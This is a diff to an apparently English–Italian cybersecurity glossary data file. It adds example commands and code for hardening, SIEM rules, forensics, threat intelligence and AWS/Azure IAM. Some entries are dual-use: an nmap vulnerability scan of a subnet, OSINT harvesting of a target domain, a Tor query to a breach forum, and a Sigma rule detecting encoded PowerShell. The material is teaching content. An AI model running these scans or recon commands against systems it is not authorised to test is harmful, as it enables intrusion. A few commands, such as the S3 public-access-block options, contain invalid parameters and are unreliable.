                 'Turning off unnecessary services through service disabling cuts the attack surface significantly. = Disattivare i servizi non necessari tramite il service disabling riduce significativamente la superficie di attacco.',
               context: 'hardening-techniques',
               difficulty: 'beginner',
+              command: 'sudo systemctl mask telnet.socket',
+              task: 'Maschera definitivamente il socket telnet in modo che non possa essere riattivato da nessuna dipendenza systemd.',
             },
             {
               english: 'Unused Port',
@@ -3001,6 +3675,8 @@ export default {
                 'Close every unused port on the firewall. = Chiudi ogni porta inutilizzata sul firewall.',
               context: 'hardening-techniques',
               difficulty: 'beginner',
+              command: 'sudo ufw deny 23/tcp',
+              task: 'Blocca con UFW la porta 23 (Telnet) inutilizzata sul firewall locale per impedire connessioni in chiaro.',
             },
             {
               english: 'Security Benchmarks (CIS)',
@@ -3013,6 +3689,9 @@ export default {
               context: 'standards',
               difficulty: 'advanced',
               note: 'Center for Internet Security. Fornisce guide dettagliate per configurare sistemi in modo sicuro.',
+              command:
+                'sudo bash cis-cat.sh -b benchmarks/CIS_Ubuntu_Linux_22.04_LTS_Benchmark_v1.0.0-xccdf.xml -r reports/',
+              task: 'Esegui il CIS-CAT contro la baseline Ubuntu 22.04 e salva il report XCCDF nella cartella reports per la revisione.',
             },
             {
               english: 'Vulnerability Scanning',
@@ -3024,6 +3703,8 @@ export default {
                 'Run a vulnerability scanning tool every week. = Esegui uno strumento di scansione vulnerabilit\u00E0 ogni settimana.',
               context: 'monitoring',
               difficulty: 'intermediate',
+              command: 'sudo nmap -sV --script vuln 10.0.0.0/24 -oA scans/weekly',
+              task: `Avvia una scansione delle vulnerabilita' sulla rete /24 con rilevamento delle versioni e salva i risultati in formato Nmap, gnmap e XML.`,
             },
             {
               english: 'Trusted Platform Module (TPM)',
@@ -3036,6 +3717,8 @@ export default {
               context: 'hardware-security',
               difficulty: 'advanced',
               note: "Chip fisico sulla scheda madre usato per garantire l'integrit\u00E0 del boot e cifrare i dischi.",
+              command: 'sudo tpm2_pcrread sha256:0,7',
+              task: 'Leggi i PCR 0 e 7 dal TPM 2.0 per verificare che la misurazione del boot non sia cambiata dopo un aggiornamento del firmware.',
             },
             {
               english: 'Principle of Default Deny',
@@ -3076,6 +3759,8 @@ export default {
               context: 'monitoring',
               difficulty: 'intermediate',
               note: 'Sequenza cronologica di record che fornisce prove documentali di una sequenza di attivit\u00E0.',
+              command: 'sudo auditctl -w /etc/passwd -p wa -k passwd_changes',
+              task: 'Aggiungi una regola auditd che traccia ogni scrittura o modifica degli attributi su /etc/passwd con il tag passwd_changes.',
             },
             {
               english: 'Log Correlation',
@@ -3087,6 +3772,14 @@ export default {
               context: 'monitoring',
               difficulty: 'advanced',
               note: 'Mettere insieme eventi da diverse fonti per trovare un legame comune.',
+              code: `# Splunk SPL: VPN login fail correlato a admin DB
+index=auth source=vpn "authentication failed"
+| rename user as src_user
+| join src_user [
+    search index=db source=mysql action=admin earliest=-15m
+  ]
+| stats count by src_user, src_ip, _time`,
+              task: 'Scrivi una regola SIEM Splunk che correla i login VPN falliti con azioni admin sul database eseguite dallo stesso utente entro 15 minuti.',
             },
             {
               english: 'Anomaly Detection',
@@ -3097,6 +3790,15 @@ export default {
                 'Using statistical baselines, anomaly detection flags unusual network traffic such as large data transfers at odd hours that may indicate data exfiltration. = Usando linee di base statistiche, il rilevamento anomalie segnala traffico di rete insolito come grandi trasferimenti di dati in orari inusuali che potrebbero indicare esfiltrazione di dati.',
               context: 'monitoring',
               difficulty: 'intermediate',
+              code: `import pandas as pd
+from sklearn.ensemble import IsolationForest
+
+df = pd.read_csv('/var/log/netflow.csv')
+X = df[['bytes_out', 'flow_duration', 'dst_port']]
+model = IsolationForest(contamination=0.01, random_state=42)
+df['anomaly'] = model.fit_predict(X)
+print(df[df['anomaly'] == -1])`,
+              task: 'Addestra un Isolation Forest sui flussi NetFlow e stampa le righe classificate come anomale per identificare possibili esfiltrazioni di dati.',
             },
             {
               english: 'Behavioral Analysis',
@@ -3109,6 +3811,20 @@ export default {
               context: 'monitoring',
               difficulty: 'advanced',
               note: 'Invece di cercare firme note, cerca azioni sospette (es. un utente che scarica gigabyte di dati mai visti prima).',
+              code: `# Sigma rule: PowerShell encoded command
+title: Suspicious PowerShell EncodedCommand
+logsource:
+  product: windows
+  service: powershell
+detection:
+  selection:
+    EventID: 4104
+    ScriptBlockText|contains:
+      - '-EncodedCommand'
+      - 'FromBase64String'
+  condition: selection
+level: high`,
+              task: `Scrivi una regola Sigma che intercetta l'esecuzione di PowerShell con comandi codificati in Base64, un comportamento tipico del malware fileless.`,
             },
             {
               english: 'File Integrity Monitoring (FIM)',
@@ -3120,6 +3836,8 @@ export default {
                 'FIM alerts you if critical system files are modified. = Il FIM ti avvisa se file di sistema critici vengono modificati.',
               context: 'monitoring',
               difficulty: 'advanced',
+              command: 'sudo aide --check --config=/etc/aide/aide.conf',
+              task: 'Confronta lo stato corrente dei file critici con il database AIDE per rilevare modifiche non autorizzate ai binari di sistema.',
             },
             {
               english: 'HIDS (Host-based IDS)',
@@ -3130,6 +3848,8 @@ export default {
                 'A HIDS monitors internal system calls and logs. = Un HIDS monitora le chiamate di sistema interne e i log.',
               context: 'defense-tools',
               difficulty: 'advanced',
+              command: 'sudo /var/ossec/bin/ossec-control status',
+              task: `Verifica lo stato dei processi del HIDS Wazuh/OSSEC sull'host per confermare che l'agente stia inviando eventi al manager.`,
             },
             {
               english: 'Log Retention',
@@ -3150,6 +3870,8 @@ export default {
                 'Windows uses Event IDs to categorize logs. = Windows usa gli ID Evento per categorizzare i log.',
               context: 'monitoring',
               difficulty: 'intermediate',
+              command: 'wevtutil qe Security /q:"*[System[(EventID=4625)]]" /c:20 /rd:true /f:text',
+              task: 'Estrai gli ultimi 20 eventi Windows con Event ID 4625 (login fallito) dal log Security per indagare un possibile attacco di brute force.',
             },
             {
               english: 'Real-time Alerting',
@@ -3161,6 +3883,13 @@ export default {
                 'Tune your real-time alerting carefully: an analyst who gets 500 alerts per shift will start ignoring all of them. = Calibra con cura la tua allarmistica in tempo reale: un analista che riceve 500 alert per turno inizierà a ignorarli tutti.',
               context: 'monitoring',
               difficulty: 'beginner',
+              code: `# Splunk SPL: alert real-time su brute force SSH
+index=linux sourcetype=auth "Failed password"
+| bin _time span=5m
+| stats dc(src_ip) as ips count as attempts by host, _time
+| where attempts > 50
+| eval severity="high"`,
+              task: `Definisci una regola SIEM che genera un alert in tempo reale quando un host registra piu' di 50 tentativi di login SSH falliti in una finestra di 5 minuti.`,
             },
           ],
         },
@@ -3179,6 +3908,9 @@ export default {
                 'A secure configuration reduces the risk of automated attacks. = Una configurazione sicura riduce il rischio di attacchi automatizzati.',
               context: 'defense-strategies',
               difficulty: 'beginner',
+              command:
+                'sudo openscap-scanner --profile xccdf_org.ssgproject.content_profile_stig --results scan-results.xml /usr/share/xml/scap/ssg/content/ssg-rhel9-ds.xml',
+              task: `Verifica la configurazione sicura del sistema contro il profilo STIG con OpenSCAP e produci un report XML per l'audit di conformita'.`,
             },
             {
               english: 'Hardened Image',
@@ -3200,6 +3932,8 @@ export default {
               context: 'management',
               difficulty: 'advanced',
               note: 'Il fenomeno per cui un sistema diventa meno sicuro a causa di modifiche manuali non tracciate.',
+              command: 'sudo ansible-playbook --check --diff site.yml -i inventory/prod',
+              task: `Avvia Ansible in modalita' dry-run con diff per rilevare la deriva della configurazione fra lo stato desiderato e i server di produzione.`,
             },
             {
               english: 'Default Settings',
@@ -3221,6 +3955,8 @@ export default {
                 'With automated provisioning, every new server is deployed with identical security settings. = Con il provisioning automatizzato, ogni nuovo server viene distribuito con impostazioni di sicurezza identiche.',
               context: 'devops-security',
               difficulty: 'intermediate',
+              command: 'terraform apply -auto-approve -var-file=prod.tfvars',
+              task: `Esegui il provisioning automatizzato dell'infrastruttura applicando il piano Terraform con le variabili di produzione.`,
             },
             {
               english: 'Infrastructure as Code (IaC) Security',
@@ -3232,6 +3968,8 @@ export default {
                 'Scan your IaC files for security misconfigurations. = Scansiona i tuoi file IaC per errori di configurazione.',
               context: 'devops-security',
               difficulty: 'advanced',
+              command: 'checkov -d ./terraform --framework terraform --output cli --soft-fail',
+              task: 'Scansiona i file Terraform con Checkov per individuare misconfigurazioni IaC (bucket S3 pubblici, security group permissivi) prima del deploy.',
             },
             {
               english: 'Group Policy Object (GPO)',
@@ -3242,6 +3980,8 @@ export default {
                 'Use GPOs to enforce security settings in Windows domains. = Usa le GPO per forzare le impostazioni di sicurezza nei domini Windows.',
               context: 'administration',
               difficulty: 'intermediate',
+              command: 'Get-GPOReport -All -ReportType HTML -Path C:\\reports\\gpo-inventory.html',
+              task: 'Esporta un inventario HTML di tutte le GPO del dominio Active Directory per documentare le impostazioni di sicurezza vigenti.',
             },
             {
               english: 'SELinux (Security-Enhanced Linux)',
@@ -3253,6 +3993,8 @@ export default {
               context: 'hardening-tools',
               difficulty: 'expert',
               note: 'Modulo di sicurezza del kernel Linux che implementa il Mandatory Access Control (MAC).',
+              command: 'sudo sestatus && sudo ausearch -m AVC -ts recent',
+              task: 'Verifica lo stato di SELinux e cerca nei log audit i recenti AVC denial per diagnosticare politiche troppo restrittive su un servizio.',
             },
             {
               english: 'AppArmor',
@@ -3264,6 +4006,8 @@ export default {
               context: 'hardening-tools',
               difficulty: 'expert',
               note: 'Sistema di sicurezza Linux che limita le capacit\u00E0 dei singoli programmi tramite profili.',
+              command: 'sudo aa-status && sudo aa-enforce /etc/apparmor.d/usr.bin.firefox',
+              task: `Controlla lo stato di AppArmor e forza in modalita' enforce il profilo di Firefox per confinarne le capacita' sul filesystem.`,
             },
             {
               english: 'Sandboxing',
@@ -3274,6 +4018,8 @@ export default {
                 'Running untrusted executables in a sandbox prevents them from accessing the host file system, registry, or network, limiting potential damage. = Eseguire eseguibili non fidati in una sandbox impedisce loro di accedere al file system host, al registro o alla rete, limitando i potenziali danni.',
               context: 'defense-strategies',
               difficulty: 'intermediate',
+              command: 'firejail --net=none --private --seccomp /opt/suspicious/sample.bin',
+              task: 'Esegui un binario sospetto in una sandbox firejail senza rete, con filesystem privato e seccomp attivo per limitare i danni.',
             },
           ],
         },
@@ -3339,6 +4085,9 @@ export default {
               context: 'incident-response',
               difficulty: 'intermediate',
               note: "Limitare i danni e impedire all'attacco di diffondersi.",
+              command:
+                'sudo iptables -I INPUT 1 -s 10.0.5.42 -j DROP && sudo iptables -I OUTPUT 1 -d 10.0.5.42 -j DROP',
+              task: `Isola immediatamente l'host compromesso bloccando il traffico in ingresso e uscita verso il suo IP per contenere la propagazione laterale.`,
             },
             {
               english: 'Eradication',
@@ -3350,6 +4099,8 @@ export default {
               context: 'incident-response',
               difficulty: 'intermediate',
               note: 'Rimuovere il malware, chiudere le vulnerabilit\u00E0 e eliminare gli account compromessi.',
+              command: 'sudo rkhunter --check --skip-keypress --report-warnings-only',
+              task: `Avvia una scansione rootkit con rkhunter sull'host compromesso durante la fase di eradicazione per individuare e rimuovere artefatti persistenti.`,
             },
             {
               english: 'recovery playbook',
@@ -3430,6 +4181,9 @@ export default {
               example: `Document hashes and timestamps during evidence acquisition so the integrity of the disk image can be verified later. = Documenta hash e timestamp durante l'acquisizione delle prove così l'integrità dell'immagine del disco può essere verificata in seguito.`,
               context: 'forensics-process',
               difficulty: 'intermediate',
+              command:
+                'sudo dcfldd if=/dev/sdb hash=sha256 hashlog=/evidence/sdb.sha256 of=/evidence/sdb.dd bs=4M conv=noerror,sync',
+              task: `Acquisisci un'immagine bit a bit del disco sospetto calcolando contestualmente l'hash SHA256 per garantire l'integrita' della prova.`,
             },
             {
               english: 'Write Blocker',
@@ -3451,6 +4205,8 @@ export default {
                 'RAM contains volatile data that is lost after power-off. = La RAM contiene dati volatili che si perdono allo spegnimento.',
               context: 'forensics',
               difficulty: 'intermediate',
+              command: 'sudo ./avml --compress /evidence/memory.lime',
+              task: 'Cattura un dump compresso della memoria volatile del sistema Linux compromesso prima dello spegnimento per preservare processi e chiavi in RAM.',
             },
             {
               english: 'Disk Image',
@@ -3462,6 +4218,9 @@ export default {
               context: 'forensics-process',
               difficulty: 'intermediate',
               note: "Una copia bit per bit dell'intero supporto di memoria.",
+              command:
+                'mmls /evidence/sdb.dd && fls -r -m / /evidence/sdb.dd > /evidence/sdb.fls.body',
+              task: `Lista le partizioni dell'immagine del disco e produci un file body in formato MAC con The Sleuth Kit per costruire la timeline forense.`,
             },
             {
               english: 'Slack Space',
@@ -3473,6 +4232,8 @@ export default {
               context: 'forensics',
               difficulty: 'expert',
               note: "Lo spazio vuoto alla fine di un file che non riempie l'intero cluster del disco.",
+              command: 'sudo blkls -s /evidence/sdb.dd > /evidence/sdb.slack.raw',
+              task: `Estrai lo slack space dall'immagine forense con The Sleuth Kit per cercare frammenti di file cancellati o dati nascosti.`,
             },
             {
               english: 'Metadata Analysis',
@@ -3482,6 +4243,8 @@ export default {
               example: `Routine metadata analysis of an exfiltrated PDF revealed the author's username and the workstation that produced it. = L'analisi dei metadati di routine di un PDF esfiltrato ha rivelato lo username dell'autore e la workstation che lo ha prodotto.`,
               context: 'forensics',
               difficulty: 'intermediate',
+              command: 'exiftool -r -a -ee /evidence/exfiltrated_docs/',
+              task: `Estrai ricorsivamente tutti i metadati EXIF dai documenti esfiltrati per rivelare autori, GPS, software e timestamp utili all'indagine.`,
             },
             {
               english: 'Steganography',
@@ -3493,6 +4256,8 @@ export default {
               context: 'forensics',
               difficulty: 'advanced',
               note: 'Dal greco "scrittura nascosta". Ad esempio nascondere un testo dentro un\'immagine.',
+              command: 'steghide extract -sf suspicious.jpg -p "$PASSPHRASE" -xf hidden.bin',
+              task: `Tenta di estrarre con steghide il payload nascosto in un'immagine JPEG sospetta usando la passphrase recuperata durante l'indagine.`,
             },
             {
               english: 'Anti-Forensics',
@@ -3533,6 +4298,8 @@ export default {
               context: 'threat-intelligence',
               difficulty: 'intermediate',
               note: 'Prove tecniche che indicano che un sistema \u00E8 stato violato (es. hash di file, IP, nomi dominio).',
+              command: 'yara -r rules/apt29.yar /opt/quarantine/ > matches.txt',
+              task: `Cerca l'IOC nei sample messi in quarantena applicando ricorsivamente le regole YARA per il gruppo APT29 e salva i match in un file.`,
             },
             {
               english: 'Indicator of Attack (IOA)',
@@ -3554,6 +4321,19 @@ export default {
                 'STIX is a standardized language for sharing threat intelligence. = Lo STIX \u00E8 un linguaggio standardizzato per condividere threat intelligence.',
               context: 'standards',
               difficulty: 'advanced',
+              code: `import json
+from stix2 import Indicator, Bundle
+
+ioc = Indicator(
+    name='APT29 C2 domain',
+    pattern="[domain-name:value = 'evil-c2.example']",
+    pattern_type='stix',
+    valid_from='2026-05-17T00:00:00Z',
+    labels=['malicious-activity'],
+)
+bundle = Bundle(objects=[ioc])
+print(bundle.serialize(pretty=True))`,
+              task: 'Genera un bundle STIX 2.1 in Python contenente un indicatore di compromissione di tipo domain-name pronto per essere condiviso via TAXII.',
             },
             {
               english: 'TAXII (Trusted Automated eXchange of Indicator Information)',
@@ -3564,6 +4344,15 @@ export default {
                 'TAXII is the protocol used to transport STIX messages. = Il TAXII \u00E8 il protocollo usato per trasportare i messaggi STIX.',
               context: 'protocols',
               difficulty: 'advanced',
+              code: `import os
+from taxii2client.v21 import Server
+
+server = Server('https://taxii.example.com/taxii2/', user='analyst', password=os.environ['TAXII_PWD'])
+api_root = server.api_roots[0]
+collection = api_root.collections[0]
+for obj in collection.get_objects().get('objects', []):
+    print(obj['type'], obj.get('pattern', obj.get('name')))`,
+              task: 'Connettiti a un server TAXII 2.1 e itera sulla prima collection per stampare gli oggetti STIX ricevuti dal feed di threat intelligence.',
             },
             {
               english: 'Cyber Kill Chain',
@@ -3586,6 +4375,8 @@ export default {
               context: 'standards',
               difficulty: 'advanced',
               note: 'Base di conoscenza globale di tattiche e tecniche degli avversari basata su osservazioni reali.',
+              command: `curl -s https://raw.githubusercontent.com/mitre/cti/master/enterprise-attack/enterprise-attack.json | jq '.objects[] | select(.type=="attack-pattern" and .name=="Credential Dumping")'`,
+              task: 'Recupera dal repository MITRE ATT&CK il JSON enterprise e filtra con jq la tecnica Credential Dumping per mappare le sotto-tecniche associate.',
             },
             {
               english: 'OSINT (Open Source Intelligence)',
@@ -3596,6 +4387,9 @@ export default {
                 "OSINT involves gathering data from public records. = L'OSINT consiste nel raccogliere dati da fonti pubbliche.",
               context: 'threat-intelligence',
               difficulty: 'intermediate',
+              command:
+                'theHarvester -d target.com -b bing,crtsh,duckduckgo -l 500 -f /reports/target_osint.html',
+              task: 'Raccogli passivamente email, sottodomini e host pubblici di un dominio target con theHarvester e produci un report HTML.',
             },
             {
               english: 'TTP (Tactics, Techniques, and Procedures)',
@@ -3616,6 +4410,8 @@ export default {
               example: `Continuous dark web monitoring caught the leaked credentials hours before the attacker tried to reuse them. = Il monitoraggio continuo del Dark Web ha intercettato le credenziali trafugate ore prima che l'attaccante provasse a riutilizzarle.`,
               context: 'threat-intelligence',
               difficulty: 'intermediate',
+              command: `curl -s --socks5-hostname 127.0.0.1:9050 'http://breachforums.onion/search?q=acme.corp'`,
+              task: 'Interroga via Tor un forum nel dark web per cercare menzioni del dominio aziendale e individuare credenziali trafugate.',
             },
           ],
         },
@@ -3699,6 +4495,8 @@ export default {
                 'When the primary database crashed, automatic failover redirected traffic to the standby server. = Quando il database primario \u00E8 andato in crash, il failover automatico ha reindirizzato il traffico sul server di standby.',
               context: 'incident-response',
               difficulty: 'intermediate',
+              command: 'sudo pcs cluster standby web01 && sudo pcs status',
+              task: 'Forza il failover del cluster Pacemaker mettendo il nodo web01 in standby e verifica che le risorse migrino sul nodo secondario.',
             },
             {
               english: 'Failback',
@@ -3709,6 +4507,8 @@ export default {
                 'Perform failback once the primary site is repaired. = Esegui il failback una volta che il sito primario \u00E8 riparato.',
               context: 'incident-response',
               difficulty: 'intermediate',
+              command: 'sudo pcs cluster unstandby web01 && sudo pcs resource move webserver web01',
+              task: 'Esegui il failback riportando il nodo web01 attivo e spostando manualmente la risorsa webserver sul sito primario riparato.',
             },
             {
               english: 'Resilience',
@@ -3864,6 +4664,8 @@ export default {
                 'A well-designed IAM model uses groups and roles so adding a new hire takes a single membership change. = Un modello IAM ben progettato usa gruppi e ruoli così aggiungere un nuovo assunto richiede un singolo cambio di membership.',
               context: 'cloud-security',
               difficulty: 'intermediate',
+              command: `aws iam list-users --query 'Users[*].[UserName,CreateDate]' --output table`,
+              task: `Elenca tutti gli utenti IAM dell'account AWS con la data di creazione per fare l'inventario delle identita' configurate.`,
             },
             {
               english: 'cloud identity provider',
@@ -3874,6 +4676,9 @@ export default {
               context: 'iam',
               difficulty: 'intermediate',
               note: 'Esempi: Okta, Azure AD/Entra ID, Google Workspace, AWS IAM Identity Center.',
+              command:
+                'aws iam create-saml-provider --saml-metadata-document file://metadata.xml --name OktaProvider',
+              task: `Registra Okta come identity provider SAML nell'account AWS per delegare l'autenticazione degli utenti aziendali.`,
             },
             {
               english: 'Service Account',
@@ -3885,6 +4690,8 @@ export default {
               context: 'iam',
               difficulty: 'intermediate',
               note: 'Account speciale non usato da persone ma da software o macchine.',
+              command: `gcloud iam service-accounts create deploy-bot --display-name='CI/CD Deploy Bot'`,
+              task: 'Crea un service account dedicato alla pipeline CI/CD su GCP per evitare di usare credenziali personali nei deploy automatici.',
             },
             {
               english: 'Role-based Access (Cloud)',
@@ -3895,6 +4702,9 @@ export default {
                 'Assign roles like "Viewer" or "Editor" in IAM. = Assegna ruoli come "Visualizzatore" o "Editor" in IAM.',
               context: 'iam',
               difficulty: 'beginner',
+              command:
+                'aws iam attach-role-policy --role-name DeveloperRole --policy-arn arn:aws:iam::aws:policy/ReadOnlyAccess',
+              task: `Assegna al ruolo DeveloperRole la policy gestita ReadOnlyAccess per concedere solo permessi di lettura sull'infrastruttura.`,
             },
             {
               english: 'IAM Policy',
@@ -3905,6 +4715,17 @@ export default {
                 'An IAM policy defines permissions in JSON format. = Una policy IAM definisce i permessi in formato JSON.',
               context: 'iam',
               difficulty: 'intermediate',
+              code: `{
+  "Version": "2012-10-17",
+  "Statement": [
+    {
+      "Effect": "Allow",
+      "Action": ["s3:GetObject", "s3:ListBucket"],
+      "Resource": ["arn:aws:s3:::reports-bucket", "arn:aws:s3:::reports-bucket/*"]
+    }
+  ]
+}`,
+              task: `Definisci una policy IAM in formato JSON che concede l'accesso in sola lettura al bucket S3 reports-bucket e ai suoi oggetti.`,
             },
             {
               english: 'Principal',
@@ -3916,6 +4737,18 @@ export default {
               context: 'iam',
               difficulty: 'advanced',
               note: 'Pu\u00F2 essere un utente, un gruppo o un account di servizio.',
+              code: `{
+  "Version": "2012-10-17",
+  "Statement": [
+    {
+      "Effect": "Allow",
+      "Principal": {"AWS": "arn:aws:iam::123456789012:user/alice"},
+      "Action": "s3:GetObject",
+      "Resource": "arn:aws:s3:::shared-bucket/*"
+    }
+  ]
+}`,
+              task: `Configura un Principal specifico in una bucket policy per autorizzare solo l'utente alice di un account esterno a leggere gli oggetti.`,
             },
             {
               english: 'Resource-based Policy',
@@ -3927,6 +4760,20 @@ export default {
               context: 'iam',
               difficulty: 'advanced',
               note: 'Permette di definire chi pu\u00F2 accedere direttamente sulla risorsa stessa.',
+              command:
+                'aws s3api put-bucket-policy --bucket shared-data --policy file://bucket-policy.json',
+              code: `{
+  "Version": "2012-10-17",
+  "Statement": [
+    {
+      "Effect": "Allow",
+      "Principal": {"AWS": "arn:aws:iam::987654321098:root"},
+      "Action": "s3:GetObject",
+      "Resource": "arn:aws:s3:::shared-data/*"
+    }
+  ]
+}`,
+              task: `Applica una policy resource-based al bucket S3 shared-data per consentire l'accesso in lettura a un account AWS esterno.`,
             },
             {
               english: 'Federated Identity',
@@ -3937,6 +4784,9 @@ export default {
               example: `Enabling federated identity via SAML lets employees use their corporate login across every SaaS app the company adopts. = Abilitare l'identità federata via SAML permette ai dipendenti di usare il login aziendale su ogni app SaaS adottata dall'azienda.`,
               context: 'iam',
               difficulty: 'advanced',
+              command:
+                'aws sts assume-role-with-saml --role-arn arn:aws:iam::123456789012:role/SAMLRole --principal-arn arn:aws:iam::123456789012:saml-provider/Okta --saml-assertion file://assertion.b64',
+              task: `Scambia l'assertion SAML emessa dall'identity provider per credenziali temporanee AWS abilitando la federazione delle identita'.`,
             },
             {
               english: 'Conditional Access',
@@ -3946,6 +4796,20 @@ export default {
               example: `A conditional access policy can block sign-ins from anonymous proxies or require MFA outside the office network. = Una policy di accesso condizionale può bloccare i login da proxy anonimi o richiedere MFA fuori dalla rete d'ufficio.`,
               context: 'iam',
               difficulty: 'advanced',
+              code: `{
+  "Version": "2012-10-17",
+  "Statement": [
+    {
+      "Effect": "Deny",
+      "Action": "*",
+      "Resource": "*",
+      "Condition": {
+        "BoolIfExists": {"aws:MultiFactorAuthPresent": "false"}
+      }
+    }
+  ]
+}`,
+              task: `Aggiungi una condizione alla policy IAM per negare ogni azione quando l'utente non ha completato l'autenticazione MFA.`,
             },
             {
               english: 'Privileged Identity Management (PIM)',
@@ -3957,6 +4821,8 @@ export default {
                 'Instead of granting permanent admin rights, PIM provides just-in-time elevated access that expires automatically after a configured time window. = Invece di concedere diritti di amministratore permanenti, il PIM fornisce accesso elevato just-in-time che scade automaticamente dopo una finestra temporale configurata.',
               context: 'iam',
               difficulty: 'expert',
+              command: `az role assignment create --assignee admin@contoso.com --role 'Owner' --scope /subscriptions/<sub-id> --condition-version '2.0'`,
+              task: 'Concedi il ruolo Owner just-in-time tramite PIM in Azure con scadenza automatica per evitare permessi amministrativi permanenti.',
             },
           ],
         },
@@ -3974,6 +4840,8 @@ export default {
                 'Cloud providers offer encryption at rest by default, but customer-managed keys give you control over revocation. = I provider cloud offrono la cifratura dei dati archiviati di default, ma le chiavi gestite dal cliente danno il controllo sulla revoca.',
               context: 'cloud-security',
               difficulty: 'intermediate',
+              command: `aws s3api put-bucket-encryption --bucket myapp-data --server-side-encryption-configuration '{"Rules":[{"ApplyServerSideEncryptionByDefault":{"SSEAlgorithm":"AES256"}}]}'`,
+              task: 'Abilita la cifratura server-side AES-256 sul bucket S3 myapp-data per proteggere i dati a riposo da accessi non autorizzati al disco.',
             },
             {
               english: 'Encryption in Transit',
@@ -3985,6 +4853,19 @@ export default {
                 'All sensitive data must use encryption in transit to prevent eavesdropping on the network. = Tutti i dati sensibili devono usare la cifratura in transito per prevenire le intercettazioni sulla rete.',
               context: 'cloud-security',
               difficulty: 'intermediate',
+              code: `{
+  "Version": "2012-10-17",
+  "Statement": [
+    {
+      "Effect": "Deny",
+      "Principal": "*",
+      "Action": "s3:*",
+      "Resource": ["arn:aws:s3:::myapp-data/*", "arn:aws:s3:::myapp-data"],
+      "Condition": {"Bool": {"aws:SecureTransport": "false"}}
+    }
+  ]
+}`,
+              task: 'Imposta una bucket policy che nega ogni richiesta non TLS al bucket myapp-data per forzare la cifratura in transito.',
             },
             {
               english: 'Client-side Encryption',
@@ -3997,6 +4878,15 @@ export default {
               context: 'cloud-security',
               difficulty: 'advanced',
               note: 'I dati vengono cifrati prima di essere inviati al cloud.',
+              code: `from boto3 import client
+from cryptography.fernet import Fernet
+
+key = Fernet.generate_key()
+fernet = Fernet(key)
+ciphertext = fernet.encrypt(b'sensitive payload')
+s3 = client('s3')
+s3.put_object(Bucket='vault', Key='secret.bin', Body=ciphertext)`,
+              task: `Cifra i dati sensibili sul client con Fernet prima di caricarli su S3 cosi' che il provider veda solo ciphertext opaco.`,
             },
             {
               english: 'Server-side Encryption (SSE)',
@@ -4008,6 +4898,9 @@ export default {
                 'Amazon S3 buckets enable SSE-S3 by default, encrypting every new object before it is written to disk. = I bucket Amazon S3 abilitano SSE-S3 di default, cifrando ogni nuovo oggetto prima che venga scritto su disco.',
               context: 'cloud-security',
               difficulty: 'intermediate',
+              command:
+                'aws s3 cp report.csv s3://reports-bucket/ --sse aws:kms --sse-kms-key-id alias/reports-key',
+              task: `Carica il file report.csv su S3 con SSE-KMS usando la chiave aliasata reports-key per cifrare l'oggetto lato server.`,
             },
             {
               english: 'Key Management Service (KMS)',
@@ -4019,6 +4912,8 @@ export default {
                 'KMS is used to create and control encryption keys. = Il KMS \u00E8 usato per creare e controllare le chiavi di cifratura.',
               context: 'cloud-security',
               difficulty: 'advanced',
+              command: `aws kms create-key --description 'Production database encryption key' --key-usage ENCRYPT_DECRYPT`,
+              task: 'Crea una nuova chiave KMS dedicata alla cifratura del database di produzione per mantenere separato il materiale crittografico.',
             },
             {
               english: 'Data Residency',
@@ -4030,6 +4925,9 @@ export default {
               context: 'compliance',
               difficulty: 'intermediate',
               note: 'Il luogo fisico dove i dati sono salvati.',
+              command:
+                'aws s3api create-bucket --bucket eu-customer-data --region eu-west-1 --create-bucket-configuration LocationConstraint=eu-west-1',
+              task: 'Crea il bucket eu-customer-data nella regione eu-west-1 per rispettare i requisiti GDPR di residenza dei dati dei clienti UE.',
             },
             {
               english: 'Data Sovereignty',
@@ -4050,6 +4948,9 @@ export default {
                 'Secure your S3 buckets to prevent data leaks. = Proteggi i tuoi bucket S3 per prevenire perdite di dati.',
               context: 'cloud-security',
               difficulty: 'intermediate',
+              command:
+                'aws s3api put-public-access-block --bucket myapp-data --public-access-block-configuration BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=true,RestrictPublicAccess=true',
+              task: `Blocca completamente l'accesso pubblico al bucket S3 myapp-data per prevenire data leak da configurazioni accidentali.`,
             },
             {
               english: 'Snapshot Backup',
@@ -4060,6 +4961,8 @@ export default {
                 'Take a snapshot before making system changes. = Fai una snapshot prima di modificare il sistema.',
               context: 'cloud-operations',
               difficulty: 'beginner',
+              command: `aws ec2 create-snapshot --volume-id vol-0a1b2c3d4e5f --description 'Pre-upgrade backup'`,
+              task: 'Crea uno snapshot del volume EBS prima di un upgrade del sistema per poter ripristinare lo stato in caso di problemi.',
             },
             {
               english: 'Data Masking',
@@ -4070,6 +4973,13 @@ export default {
                 'Dynamic data masking in the query layer shows analysts only the last four digits of each customer card number. = Il mascheramento dinamico dei dati nel query layer mostra agli analisti solo le ultime quattro cifre di ogni numero di carta cliente.',
               context: 'data-security',
               difficulty: 'advanced',
+              code: `def mask_card(card_number: str) -> str:
+    if len(card_number) < 4:
+        return '****'
+    return '*' * (len(card_number) - 4) + card_number[-4:]
+
+# 4111111111111234 -> ************1234`,
+              task: 'Implementa una funzione di mascheramento che mostra solo le ultime quattro cifre del numero di carta nei report per gli analisti.',
             },
           ],
         },
@@ -4087,6 +4997,9 @@ export default {
                 'An independent third-party cloud audit verifies that security controls, access policies, and encryption standards meet the contractual and regulatory requirements. = Un audit del cloud indipendente di terze parti verifica che i controlli di sicurezza, le policy di accesso e gli standard di crittografia soddisfino i requisiti contrattuali e normativi.',
               context: 'compliance',
               difficulty: 'intermediate',
+              command:
+                'aws cloudtrail create-trail --name org-audit-trail --s3-bucket-name audit-logs-bucket --is-multi-region-trail --enable-log-file-validation',
+              task: `Configura un trail CloudTrail multi-regione che salva i log su S3 con validazione dell'integrita' per supportare l'audit del cloud.`,
             },
             {
               english: 'CSA (Cloud Security Alliance)',
@@ -4234,6 +5147,8 @@ export default {
               context: 'threats',
               difficulty: 'intermediate',
               note: "Permette di installare app fuori dall'App Store, ma espone il sistema a rischi.",
+              command: 'ideviceinfo -k DeviceClass && ideviceinstaller -l | grep -i cydia',
+              task: 'Verifica se il dispositivo iOS connesso ha installato Cydia, segnale tipico di un jailbreak avvenuto.',
             },
             {
               english: 'Rooting',
@@ -4244,6 +5159,8 @@ export default {
                 'After rooting, an Android device loses some built-in security guarantees. = Dopo il rooting, un dispositivo Android perde alcune garanzie di sicurezza integrate.',
               context: 'threats',
               difficulty: 'intermediate',
+              command: `adb shell 'which su || echo not_rooted'`,
